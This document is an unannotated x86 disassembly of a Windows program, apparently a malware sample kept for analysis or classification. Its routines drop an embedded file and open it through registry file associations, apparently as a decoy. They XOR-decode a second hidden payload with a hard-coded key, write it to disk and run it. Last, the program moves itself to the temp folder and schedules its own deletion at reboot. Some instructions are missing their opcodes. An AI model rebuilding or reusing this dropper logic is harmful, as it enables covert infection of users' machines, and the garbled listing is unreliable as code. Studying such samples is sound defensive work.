sub_401000
push 0xffffffff
push sub_40691b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push 0xe40
call ??2@YAPAXI@Z
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
mov ecx eax
call sub_401070
mov [ rw-data ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_401070
mov edx ecx
push esi
push edi
mov ecx 0x41
lea esi [ edx + 0x4 ]
xor eax eax
mov edi esi
[ edi ]
mov ecx 0x41
lea edi [ esi + 0x208 ]
[ edi ]
mov ecx 0x41
lea edi [ esi + 0x410 ]
[ edi ]
mov ecx 0x41
lea edi [ edx + 0xc38 ]
mov [ edx + 0x824 ] eax
mov [ edx ] r--data
[ edi ]
mov ecx 0x41
lea edi [ edx + 0x828 ]
[ edi ]
mov ecx 0x41
lea edi [ edx + 0xa30 ]
[ edi ]
pop edi
mov eax edx
pop esi
retn
sub_401130
push 0xffffffff
push sub_40693b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ ecx ] r--data
mov ecx [ rw-data ]
mov [ esp + 0xc ] 0x0
test ecx ecx
je r-xdata
mov ecx [ esp + 0x4 ]
mov [ rw-data ] 0x0
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_401190
push ecx
push esi
mov esi ecx
call sub_4018c0
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
add esi 0x61c
push 0x40000000
push esi
call [ CreateFileW@IAT ]
mov esi eax
lea eax [ esp + 0x4 ]
push 0x0
push eax
push 0xe800
push rw-data
push esi
call [ WriteFile@IAT ]
push esi
call [ CloseHandle@IAT ]
pop esi
pop ecx
retn
sub_4011e0
sub esp 0x14
mov eax 0x5c
push 0x0
mov [ esp + 0x8 ] ax
mov [ esp + 0xa ] ax
mov [ esp + 0x12 ] ax
mov [ esp + 0x14 ] ax
lea eax [ esp + 0x4 ]
mov [ esp + 0x4 ] 0x63
push eax
mov [ esp + 0xa ] 0x3a
mov [ esp + 0x10 ] 0x74
mov [ esp + 0x12 ] 0x6d
mov [ esp + 0x14 ] 0x70
mov [ esp + 0x1a ] 0x0
call [ CreateDirectoryW@IAT ]
cmp eax 0x1
je r-xdata
mov edx [ esp + 0x18 ]
lea ecx [ esp ]
push ecx
push edx
call [ wcscpy@IAT ]
add esp 0x8
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
add esp 0x14
retn 0x4
sub_401260
sub esp 0xaac
xor eax eax
push ebx
mov [ esp + 0x22 ] eax
push ebp
mov [ esp + 0x2a ] eax
push esi
mov [ esp + 0x32 ] eax
push edi
add ecx 0x61c
xor ebx ebx
mov [ esp + 0x3a ] eax
push 0x2e
push ecx
mov [ esp + 0x34 ] bx
mov [ esp + 0x46 ] ax
mov [ esp + 0x2c ] ecx
call [ wcschr@IAT ]
lea ecx [ esp + 0x34 ]
push eax
push ecx
call [ wcscpy@IAT ]
mov ecx 0x81
xor eax eax
lea edi [ esp + 0x8c6 ]
mov [ esp + 0x8c4 ] bx
[ edi ]
mov ebp [ swprintf@IAT ]
add esp 0x10
lea edx [ esp + 0x2c ]
stosw [ edi ]
push edx
lea eax [ esp + 0x8b8 ]
push rw-data
push eax
call ebp
mov esi [ RegOpenKeyExW@IAT ]
add esp 0xc
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x2c ]
push ecx
push 0xf003f
push ebx
push edx
push 0x80000000
call esi
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
lea eax [ esp + 0x1c ]
lea ecx [ esp + 0x7b0 ]
push eax
push ecx
push ebx
push ebx
push ebx
push edx
mov [ esp + 0x34 ] 0x104
call [ RegQueryValueExW@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0xaac
retn
mov eax [ esp + 0x14 ]
push eax
call [ RegCloseKey@IAT ]
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x95 ]
mov [ esp + 0x94 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x81
xor eax eax
lea edi [ esp + 0x19a ]
mov [ esp + 0x198 ] bx
[ edi ]
lea ecx [ esp + 0x7b0 ]
lea edx [ esp + 0x198 ]
push ecx
push rw-data
push edx
stosw [ edi ]
call ebp
add esp 0xc
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x198 ]
push eax
push 0xf003f
push ebx
push ecx
push 0x80000000
call esi
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0xaac
retn
mov ecx [ esp + 0x18 ]
mov edi [ RegQueryValueExW@IAT ]
lea edx [ esp + 0x28 ]
lea eax [ esp + 0x94 ]
push edx
push eax
push ebx
push ebx
push ebx
push ecx
mov [ esp + 0x40 ] 0x104
call edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0xaac
retn
mov edx [ esp + 0x18 ]
push edx
call [ RegCloseKey@IAT ]
mov ecx 0x10
xor eax eax
lea edi [ esp + 0x54 ]
mov [ esp + 0x3a0 ] bx
[ edi ]
mov [ esp + 0x44 ] eax
mov ecx 0x81
mov [ esp + 0x48 ] eax
lea edi [ esp + 0x3a2 ]
mov [ esp + 0x4c ] eax
push rw-data
[ edi ]
lea ecx [ esp + 0x98 ]
mov [ esp + 0x54 ] 0x44
push ecx
mov [ esp + 0x48 ] ebx
stosw [ edi ]
call [ wcsstr@IAT ]
add esp 0x8
cmp eax ebx
je r-xdata
push 0x3
lea edx [ esp + 0x30 ]
push rw-data
push edx
call [ StrCmpNIW@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x24 ]
lea eax [ esp + 0x94 ]
push edx
push eax
lea ecx [ esp + 0x3a8 ]
push rw-data
push ecx
call ebp
mov ecx 0x81
xor eax eax
lea edi [ esp + 0x5ba ]
mov [ esp + 0x5b8 ] bx
[ edi ]
add esp 0x10
lea edx [ esp + 0x5a8 ]
stosw [ edi ]
push 0x104
lea eax [ esp + 0x3a4 ]
push edx
push eax
call [ ExpandEnvironmentStringsW@IAT ]
lea ecx [ esp + 0x40 ]
lea edx [ esp + 0x50 ]
push ecx
push edx
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ esp + 0x5c4 ]
push ebx
push eax
push ebx
call [ CreateProcessW@IAT ]
neg eax
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
add esp 0xaac
retn
mov [ eax ] bx
lea eax [ esp + 0x10 ]
push eax
push 0xf003f
push ebx
push rw-data
push 0x80000000
call esi
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0x94 ]
push ecx
push edx
push ebx
push ebx
push ebx
push eax
mov [ esp + 0x38 ] 0x104
call edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0xaac
retn
mov ecx [ esp + 0x10 ]
push ecx
call [ RegCloseKey@IAT ]
pop edi
pop esi
pop ebp
xor al al
pop ebx
add esp 0xaac
retn
sub_401580
sub esp 0x54
mov edx ecx
push edi
mov ecx 0x10
xor eax eax
lea edi [ esp + 0x18 ]
mov [ esp + 0x4 ] eax
[ edi ]
mov [ esp + 0x8 ] eax
lea ecx [ esp + 0x4 ]
mov [ esp + 0xc ] eax
push ecx
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x18 ]
lea ecx [ edx + 0xa30 ]
push eax
push ecx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
add edx 0xc38
push 0x0
push edx
mov [ esp + 0x3c ] 0x44
call [ CreateProcessW@IAT ]
pop edi
add esp 0x54
retn
sub_4015e0
sub esp 0x20
push ebp
push esi
push edi
lea edi [ esp + 0xc ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0xc ] 0x61
mov [ esp + 0xd ] 0x62
mov [ esp + 0xe ] 0x63
mov [ esp + 0xf ] 0x64
mov [ esp + 0x10 ] 0x65
mov [ esp + 0x11 ] 0x66
mov [ esp + 0x12 ] 0x67
mov [ esp + 0x13 ] 0x21
mov [ esp + 0x14 ] 0x40
mov [ esp + 0x15 ] 0x23
mov [ esp + 0x16 ] 0x24
mov [ esp + 0x17 ] 0x25
mov [ esp + 0x18 ] 0x5e
mov [ esp + 0x19 ] 0x26
mov [ esp + 0x1a ] 0x2a
mov [ esp + 0x1b ] 0x28
mov [ esp + 0x1c ] 0x29
mov [ esp + 0x1d ] 0x5f
mov [ esp + 0x1e ] 0x2b
mov [ esp + 0x1f ] 0x7b
mov [ esp + 0x20 ] 0x7d
mov [ esp + 0x21 ] 0x3c
mov [ esp + 0x22 ] 0x3e
mov [ esp + 0x23 ] 0x3f
mov [ esp + 0x24 ] 0x2f
mov [ esp + 0x25 ] 0x2e
mov [ esp + 0x26 ] 0x27
mov [ esp + 0x27 ] 0x3b
mov [ esp + 0x28 ] 0x5d
mov [ esp + 0x29 ] 0x5b
mov [ esp + 0x2a ] 0x0
xor esi esi
[ edi ]
not ecx
dec ecx
xor edi edi
mov ebp ecx
mov ecx [ esp + 0x38 ]
test ecx ecx
jbe r-xdata
mov eax [ esp + 0x34 ]
pop edi
pop esi
pop ebp
add esp 0x20
retn 0xc
push ebx
mov ebx [ esp + 0x38 ]
mov eax edi
xor edx edx
div ebp
mov al [ esp + edx + 0x10 ]
mov dl [ esi + ebx ]
add al dl
mov dl [ esp + 0x34 ]
xor al dl
mov [ esi + ebx ] al
inc esi
inc edi
cmp esi ecx
jb r-xdata
xor edi edi
test esi 0x3ff
jne r-xdata
mov eax ebx
pop ebx
pop edi
pop esi
pop ebp
add esp 0x20
retn 0xc
sub_401700
push ecx
push esi
push edi
mov esi ecx
call sub_4019d0
mov eax [ esp + 0x10 ]
push 0x9918
push rw-data
push eax
mov ecx esi
call sub_4015e0
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
add esi 0xc38
push 0x40000000
push esi
mov edi eax
call [ CreateFileW@IAT ]
lea ecx [ esp + 0x8 ]
push 0x0
push ecx
mov esi eax
push 0x9918
push edi
push esi
call [ WriteFile@IAT ]
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ecx
retn 0x4
sub_401770
sub esp 0x410
push esi
mov esi ecx
push edi
mov ecx 0x81
xor eax eax
lea edi [ esp + 0xa ]
mov [ esp + 0x8 ] 0x0
mov [ esp + 0x210 ] 0x0
[ edi ]
stosw [ edi ]
mov ecx 0x81
xor eax eax
lea edi [ esp + 0x212 ]
[ edi ]
stosw [ edi ]
lea eax [ esp + 0x210 ]
push eax
push 0x104
call [ GetTempPathW@IAT ]
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x210 ]
push ecx
push 0x0
push rw-data
push edx
call [ GetTempFileNameW@IAT ]
lea eax [ esp + 0x8 ]
push eax
call [ DeleteFileW@IAT ]
lea ecx [ esp + 0x8 ]
add esi 0x414
push ecx
push esi
call [ MoveFileW@IAT ]
push 0x4
lea edx [ esp + 0xc ]
push 0x0
push edx
call [ MoveFileExW@IAT ]
pop edi
pop esi
add esp 0x410
retn
sub_401810
mov eax 0x1008
call sub_4065d0
mov edx ecx
push edi
mov ecx 0x200
xor eax eax
lea edi [ esp + 0x6 ]
mov [ esp + 0x4 ] 0x0
[ edi ]
mov ecx 0x200
lea edi [ esp + 0x80a ]
mov [ esp + 0x808 ] ax
add edx 0x414
[ edi ]
push edx
lea eax [ esp + 0x8 ]
push rw-data
push eax
call [ swprintf@IAT ]
add esp 0xc
lea ecx [ esp + 0x808 ]
push 0x104
push ecx
push rw-data
call [ GetEnvironmentVariableW@IAT ]
test eax eax
pop edi
je r-xdata
add esp 0x1008
retn
push 0x0
lea edx [ esp + 0x4 ]
push 0x0
lea eax [ esp + 0x80c ]
push edx
push eax
push 0x0
push 0x0
call [ ShellExecuteW@IAT ]
sub_4018c0
sub esp 0x410
push ebx
push ebp
push esi
mov ebx ecx
push edi
mov ecx 0x81
xor eax eax
lea edi [ esp + 0x12 ]
mov [ esp + 0x10 ] 0x0
push 0x104
[ edi ]
stosw [ edi ]
lea eax [ esp + 0x14 ]
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
mov ebp [ wcscpy@IAT ]
lea ecx [ esp + 0x10 ]
lea edx [ ebx + 0x414 ]
push ecx
push edx
call ebp
lea eax [ esp + 0x18 ]
push eax
call [ wcslen@IAT ]
mov esi eax
add esp 0xc
sub esi 0x2
cmp [ esp + esi * 2 + 0x10 ] 0x5c
lea eax [ esp + esi * 2 + 0x10 ]
je r-xdata
mov ecx 0x81
xor eax eax
lea edi [ esp + 0x21a ]
mov [ esp + 0x218 ] 0x0
[ edi ]
lea ecx [ esp + esi * 2 + 0x12 ]
lea edx [ esp + 0x218 ]
push ecx
push edx
stosw [ edi ]
call ebp
lea eax [ esp + 0x220 ]
push rw-data
push eax
call [ wcsstr@IAT ]
lea ecx [ esp + 0x228 ]
lea edx [ ebx + 0x20c ]
push ecx
push edx
mov [ eax ] 0x0
call ebp
lea eax [ esp + 0x28 ]
lea ecx [ ebx + 0x4 ]
push eax
push ecx
mov [ esp + esi * 2 + 0x30 ] 0x0
call ebp
add esp 0x20
lea edx [ esp + 0x218 ]
lea eax [ esp + 0x10 ]
add ebx 0x61c
push edx
push eax
push rw-data
push ebx
call [ swprintf@IAT ]
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x410
retn
sub eax 0x2
dec esi
cmp [ eax ] 0x5c
jne r-xdata
sub_4019d0
push esi
mov esi ecx
push edi
lea edi [ esi + 0xa30 ]
push edi
call sub_4011e0
lea eax [ esi + 0x828 ]
add esi 0xc38
push eax
push edi
push rw-data
push esi
call [ swprintf@IAT ]
add esp 0x10
pop edi
pop esi
retn
sub_401a00
sub esp 0x90
push ebx
push ebp
push esi
push edi
call [ GetInputState@IAT ]
push 0x0
push 0x0
push 0x0
call [ GetCurrentThreadId@IAT ]
push eax
call [ PostThreadMessageW@IAT ]
push 0x0
push 0x0
lea eax [ esp + 0x8c ]
push 0x0
push eax
call [ GetMessageW@IAT ]
push 0x0
call [ time@IAT ]
push eax
call [ srand@IAT ]
mov ecx 0x8
xor eax eax
lea edi [ esp + 0x69 ]
mov [ esp + 0x68 ] 0x0
[ edi ]
mov ecx 0x9
lea edi [ esp + 0x41 ]
mov [ esp + 0x40 ] al
push 0x20
[ edi ]
lea ecx [ esp + 0x6c ]
push ecx
call sub_401fa0
add esp 0x10
lea edx [ esp + 0x60 ]
lea eax [ esp + 0x38 ]
push edx
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
mov esi [ MultiByteToWideChar@IAT ]
lea ecx [ esp + 0x38 ]
push 0x0
push 0x0
push 0xffffffff
push ecx
push 0x0
push 0x0
call esi
mov ebx [ GetProcessHeap@IAT ]
mov ebp eax
lea edx [ ebp + ebp ]
push edx
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
push ebp
push edi
lea eax [ esp + 0x40 ]
push 0xffffffff
push eax
push 0x0
push 0x0
call esi
mov ebp [ CreateEventW@IAT ]
push edi
push 0x0
push 0x1
push 0x0
call ebp
push rw-data
push 0x0
push 0x1
push 0x0
mov [ rw-data ] eax
call ebp
xor ecx ecx
xor edx edx
mov [ rw-data ] eax
mov [ esp + 0x29 ] ecx
mov [ esp + 0x1d ] edx
lea eax [ esp + 0x28 ]
mov [ esp + 0x2d ] ecx
mov [ esp + 0x21 ] edx
push 0x5
push eax
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x39 ] cl
mov [ esp + 0x24 ] cl
mov [ esp + 0x2d ] dl
call sub_401fa0
add esp 0x8
lea ecx [ esp + 0x28 ]
lea edx [ esp + 0x1c ]
push ecx
push rw-data
push edx
call [ sprintf@IAT ]
add esp 0xc
call sub_401000
mov [ rw-data ] eax
push 0x0
push 0x0
lea eax [ esp + 0x24 ]
push 0xffffffff
push eax
push 0x0
push 0x0
call esi
lea ecx [ eax + eax ]
push ecx
push 0x8
mov [ esp + 0x3c ] eax
call ebx
push eax
call [ HeapAlloc@IAT ]
mov ebp eax
lea eax [ esp + 0x1c ]
mov edx [ esp + 0x34 ]
push edx
push ebp
push 0xffffffff
push eax
push 0x0
push 0x0
call esi
push ebp
mov ecx [ esp + 0xa8 ]
push ecx
mov ecx [ rw-data ]
call sub_401100
xor edx edx
mov [ esp + 0x10 ] 0x0
mov [ esp + 0x14 ] edx
push edx
mov [ esp + 0x1c ] edx
push edx
mov esi [ _beginthreadex@IAT ]
push edx
push sub_401c70
push edx
push edx
call esi
push 0x0
push 0x0
push 0x0
push sub_401d10
push 0x0
push 0x0
mov [ esp + 0x40 ] eax
call esi
push 0x0
push 0x0
push 0x0
push sub_401ce0
push 0x0
push 0x0
mov [ esp + 0x5c ] eax
call esi
add esp 0x48
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x10 ]
push 0xffffffff
push 0x1
push eax
push 0x3
call [ WaitForMultipleObjects@IAT ]
mov esi [ CloseHandle@IAT ]
mov ecx [ esp + 0x10 ]
push ecx
call esi
mov edx [ esp + 0x14 ]
push edx
call esi
mov eax [ esp + 0x18 ]
push eax
call esi
mov ecx [ rw-data ]
push ecx
call esi
mov edx [ rw-data ]
push edx
call esi
push edi
push 0x8
call ebx
mov esi [ HeapFree@IAT ]
push eax
call esi
push ebp
push 0x8
call ebx
push eax
call esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x90
retn 0x10
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x90
retn 0x10
sub_401c70
mov ecx [ rw-data ]
call sub_401190
mov ecx [ rw-data ]
call sub_401260
test al al
jne r-xdata
mov eax [ rw-data ]
push eax
call [ SetEvent@IAT ]
mov ecx [ rw-data ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov ecx [ rw-data ]
call sub_401770
mov ecx [ rw-data ]
call sub_4018a0
test al al
je r-xdata
mov ecx [ rw-data ]
call sub_401560
xor eax eax
retn 0x4
mov ecx [ rw-data ]
call sub_401810
sub_401d10
push 0xffffffff
push sub_406966
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x828
push ebx
push esi
push edi
xor ebx ebx
mov ecx 0x81
xor eax eax
lea edi [ esp + 0x62e ]
mov [ esp + 0x62c ] bx
[ edi ]
lea ecx [ esp + 0x10 ]
stosw [ edi ]
call Ordinal_MFC42u_540
lea ecx [ esp + 0xc ]
mov [ esp + 0x83c ] ebx
call Ordinal_MFC42u_540
mov ecx 0x81
xor eax eax
lea edi [ esp + 0x426 ]
mov [ esp + 0x424 ] bx
[ edi ]
stosw [ edi ]
mov ecx 0x81
xor eax eax
lea edi [ esp + 0x16 ]
mov [ esp + 0x14 ] bx
[ edi ]
stosw [ edi ]
mov ecx 0x81
xor eax eax
lea edi [ esp + 0x21e ]
mov [ esp + 0x21c ] bx
[ edi ]
stosw [ edi ]
lea eax [ esp + 0x62c ]
push 0x104
push eax
push ebx
mov [ esp + 0x848 ] 0x1
call [ GetModuleFileNameW@IAT ]
mov ecx [ rw-data ]
add ecx 0x20c
push ecx
push 0x104
lea ecx [ esp + 0x18 ]
call Ordinal_MFC42u_2914
mov edi [ wcscpy@IAT ]
push eax
call edi
add esp 0x8
lea ecx [ esp + 0x10 ]
push ebx
call Ordinal_MFC42u_2910
push rw-data
push eax
call [ wcsstr@IAT ]
add esp 0x8
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov esi [ swprintf@IAT ]
lea edx [ eax + 0x20c ]
add eax 0x4
push edx
push eax
lea eax [ esp + 0x224 ]
push rw-data
push eax
call esi
mov ecx [ rw-data ]
add esp 0x10
add ecx 0x4
push ecx
push 0x104
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42u_2914
push eax
call edi
add esp 0x8
lea ecx [ esp + 0xc ]
push 0x5c
push ebx
push ebx
call Ordinal_MFC42u_2910
push eax
call [ StrRChrIW@IAT ]
cmp eax ebx
je r-xdata
mov [ eax + 0x2 ] bx
mov edi [ _waccess@IAT ]
lea eax [ esp + 0x14 ]
push ebx
push eax
call edi
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esp + 0xc ]
lea edx [ esp + 0x424 ]
sub eax ecx
sar eax 0x1
push eax
push ecx
push edx
call [ wcsncpy@IAT ]
mov eax [ esp + 0x1c ]
add esp 0xc
lea ecx [ esp + 0x424 ]
lea edx [ esp + 0x14 ]
push eax
push ecx
push rw-data
push edx
call esi
add esp 0x10
lea edx [ esp + 0x14 ]
push edx
call [ DeleteFileW@IAT ]
lea eax [ esp + 0x14 ]
push ebx
push eax
call sub_406480
mov ecx [ rw-data ]
add esp 0x8
mov esi eax
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov eax [ rw-data ]
lea edx [ esp + 0x21c ]
add eax 0x20c
push edx
push eax
push esi
call sub_4064f0
push esi
call sub_406510
add esp 0x10
lea ecx [ esp + 0xc ]
mov [ esp + 0x83c ] bl
call Ordinal_MFC42u_800
lea ecx [ esp + 0x10 ]
mov [ esp + 0x83c ] 0xffffffff
call Ordinal_MFC42u_800
xor eax eax
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
push edx
lea eax [ esp + 0x1c ]
push rw-data
push eax
call esi
lea ecx [ esp + 0x24 ]
push ebx
push ecx
call edi
add esp 0x18
cmp eax 0xffffffff
jne r-xdata
lea ecx [ esp + 0xc ]
mov [ esp + 0x83c ] bl
call Ordinal_MFC42u_800
lea ecx [ esp + 0x10 ]
mov [ esp + 0x83c ] 0xffffffff
call Ordinal_MFC42u_800
or eax 0xffffffff
jmp r-xdata
mov ecx [ esp + 0x834 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x834
retn 0x4
sub_401fa0
push ebx
mov ebx [ esp + 0xc ]
push esi
xor esi esi
test ebx ebx
jle r-xdata
mov eax [ esp + 0xc ]
pop esi
pop ebx
retn
push ebp
mov ebp [ rand@IAT ]
push edi
mov edi [ esp + 0x14 ]
call ebp
xor edx edx
mov ecx 0x3e
div ecx
inc esi
cmp esi ebx
mov dl [ edx + r--data ]
mov [ esi + edi - 0x1 ] dl
jl r-xdata
mov eax edi
pop edi
pop ebp
pop esi
pop ebx
retn
sub_401fe0
sub esp 0x1c
mov eax ecx
push esi
push edi
xor edx edx
lea ecx [ eax + 0x9e8 ]
lea edi [ eax + 0xf7c ]
mov [ esp + 0xc ] ecx
mov ecx 0x7
lea esi [ esp + 0x8 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0x10 ] r--data
mov [ esp + 0x14 ] 0x101
mov [ esp + 0x18 ] 0x11e
mov [ esp + 0x1c ] 0xf
mov [ esp + 0x20 ] edx
mov [ eax + 0x1af18 ] edx
[ edi ] [ esi ]
lea ecx [ eax + 0x8f4 ]
lea edi [ eax + 0xf98 ]
mov [ esp + 0x8 ] ecx
lea ecx [ eax + 0xe68 ]
mov [ esp + 0xc ] ecx
mov ecx 0x7
lea esi [ esp + 0x8 ]
mov [ esp + 0x10 ] r--data
mov [ esp + 0x14 ] edx
mov [ esp + 0x18 ] 0x1e
mov [ esp + 0x1c ] 0xf
mov [ esp + 0x20 ] edx
[ edi ] [ esi ]
lea ecx [ eax + 0xee0 ]
lea edi [ eax + 0xfb4 ]
mov [ esp + 0x8 ] ecx
mov ecx 0x7
lea esi [ esp + 0x8 ]
mov [ esp + 0xc ] edx
mov [ esp + 0x10 ] r--data
mov [ esp + 0x14 ] edx
mov [ esp + 0x18 ] 0x13
mov [ esp + 0x1c ] 0x7
mov [ esp + 0x20 ] edx
mov [ eax + 0x1af1c ] edx
[ edi ] [ esi ]
pop edi
mov [ eax + 0x1af20 ] edx
pop esi
add esp 0x1c
retn
sub_4020d0
sub esp 0x10
lea eax [ esp ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
call [ FileTimeToSystemTime@IAT ]
mov edx [ esp ]
mov al [ esp + 0x2 ]
mov cl [ esp + 0x6 ]
and eax 0xf
shl edx 0x9
sub edx 0x7601
and ecx 0x1f
and edx 0xfe00
shl eax 0x5
or edx eax
mov eax [ esp + 0x1c ]
or edx ecx
mov cl [ esp + 0xa ]
mov [ eax ] dx
mov edx [ esp + 0x8 ]
mov al [ esp + 0xc ]
and ecx 0x3f
shl edx 0x6
or ecx edx
mov edx [ esp + 0x20 ]
shl al 0x1
shl ecx 0x5
and eax 0x1f
or ecx eax
mov [ edx ] cx
add esp 0x10
retn
sub_402170
sub esp 0x18
lea eax [ esp + 0x8 ]
push eax
call [ GetLocalTime@IAT ]
lea ecx [ esp ]
lea edx [ esp + 0x8 ]
push ecx
push edx
call [ SystemTimeToFileTime@IAT ]
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push ecx
push edx
push eax
call sub_4020d0
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push ecx
push edx
call sub_402140
mov ecx [ esp + 0x34 ]
mov [ ecx ] eax
add esp 0x30
retn
sub_4021e0
sub esp 0x44
lea eax [ esp + 0x10 ]
push esi
mov esi [ esp + 0x4c ]
push eax
push esi
call [ GetFileInformationByHandle@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
push ebp
mov edx eax
xor ebp ebp
and edx 0x1
je r-xdata
mov eax 0x200
pop esi
add esp 0x44
retn
test al 0x2
je r-xdata
mov ebp 0x1
test al 0x4
je r-xdata
or ebp 0x2
mov ecx eax
and ecx 0x10
je r-xdata
or ebp 0x4
test al 0x20
je r-xdata
or ebp 0x10
test ecx ecx
je r-xdata
or ebp 0x20
or ebp 0x80000000
or ebp 0x40000000
jmp r-xdata
push ebx
push edi
push 0x0
push esi
call [ GetFileSize@IAT ]
cmp eax 0x28
mov [ esp + 0x14 ] eax
jbe r-xdata
or ebp 0x800000
or ebp 0x1000000
test edx edx
jne r-xdata
mov eax [ esp + 0x5c ]
pop edi
test eax eax
pop ebx
je r-xdata
mov edi [ SetFilePointer@IAT ]
push 0x0
push 0x0
push 0x0
push esi
call edi
mov ebx [ ReadFile@IAT ]
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
lea edx [ esp + 0x60 ]
push 0x2
push edx
push esi
call ebx
push 0x0
push 0x0
push 0x24
push esi
call edi
lea eax [ esp + 0x10 ]
push 0x0
push eax
lea ecx [ esp + 0x20 ]
push 0x4
push ecx
push esi
call ebx
cmp [ esp + 0x58 ] 0x54ad
jne r-xdata
mov eax [ esp + 0x58 ]
pop ebp
test eax eax
je r-xdata
mov [ eax ] ebp
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
lea edx [ eax + 0x34 ]
cmp ecx edx
jbe r-xdata
mov esi [ esp + 0x58 ]
test esi esi
je r-xdata
mov edx [ esp + 0x8 ]
mov [ eax ] edx
push 0x0
push 0x0
push eax
push esi
call edi
lea eax [ esp + 0x10 ]
push 0x0
push eax
lea ecx [ esp + 0x24 ]
push 0x4
push ecx
push esi
call ebx
mov eax [ esp + 0x1c ]
cmp eax 0x5a4d
je r-xdata
mov esi [ esp + 0x5c ]
test esi esi
je r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x20 ]
push eax
push ecx
call sub_402140
mov edx [ esp + 0x34 ]
mov [ esi ] eax
mov eax [ esp + 0x30 ]
push edx
push eax
call sub_402140
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x28 ]
push ecx
push edx
mov [ esi + 0x4 ] eax
call sub_402140
add esp 0x18
mov [ esi + 0x8 ] eax
or ebp __dos_header
cmp eax 0x454e
je r-xdata
xor eax eax
pop esi
add esp 0x44
retn
mov edx [ esp + 0x2c ]
lea eax [ esp + 0x50 ]
lea ecx [ esp + 0x4c ]
push eax
mov eax [ esp + 0x2c ]
push ecx
push edx
push eax
call sub_4020d0
mov ecx [ esp + 0x5c ]
mov edx [ esp + 0x60 ]
and ecx 0xffff
and edx 0xffff
shl ecx 0x10
add esp 0x10
or ecx edx
mov [ esi ] ecx
cmp eax 0x454c
je r-xdata
cmp eax 0x4550
jne r-xdata
sub_4023e0
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
xor edi edi
cmp [ esi + 0xe7e ] di
mov [ esi + 0x1af50 ] eax
mov [ esi + 0x1af48 ] edi
mov [ esi + 0x1af44 ] edi
mov [ esi + 0x1af4c ] edi
jne r-xdata
pop edi
pop esi
retn
lea ecx [ esi + 0x1e40 ]
push ebx
push ebp
xor ebx ebx
mov eax r--data
mov [ esp + 0x14 ] ecx
mov ebp [ esp + 0x14 ]
add eax 0x4
inc ebx
add ebp 0x4
cmp eax r--data
mov [ esp + 0x14 ] ebp
jl r-xdata
mov [ esi + edi + 0x1b3d ] bl
mov ecx [ eax ]
mov ebp 0x1
inc edi
shl ebp cl
inc edx
cmp edx ebp
jl r-xdata
mov edx [ esp + 0x14 ]
mov ebp 0x1
mov [ edx ] edi
mov ecx [ eax ]
shl ebp cl
xor edx edx
test ebp ebp
jle r-xdata
cmp edi 0x100
push rw-data
sete al
push eax
push esi
call sub_4023b0
mov [ edi + esi + 0x1b3c ] bl
lea ecx [ esi + 0x1eb4 ]
add esp 0xc
xor edi edi
xor ebx ebx
mov eax r--data
mov [ esp + 0x14 ] ecx
mov ebp [ esp + 0x14 ]
add eax 0x4
inc ebx
